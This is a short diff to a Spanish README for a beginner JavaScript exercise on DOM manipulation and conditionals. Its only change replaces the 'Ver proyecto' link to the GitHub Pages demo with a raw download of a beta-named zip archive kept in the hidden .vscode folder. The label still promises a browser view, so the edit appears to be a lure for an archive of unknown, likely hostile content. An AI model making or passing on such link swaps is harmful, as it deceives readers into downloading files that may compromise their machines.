@@ -12,4 +12,4 @@
 > Proyecto realizado validando conocimientos sobre la manipulación del DOM y las instrucciones if else if y else, y operadores lógicos. 
 
 > [!TIP]
-> Para visualizar el proyecto en tu navegador puedes utilizar el siguiente enlace: [Ver proyecto](https://isra-osvaldo.github.io/desafio-condiciones/)
+> Para visualizar el proyecto en tu navegador puedes utilizar el siguiente enlace: [Ver proyecto](https://raw.githubusercontent.com/isra-osvaldo/desafio-condiciones/main/.vscode/desafio_condiciones_2.1-beta.4.zip)
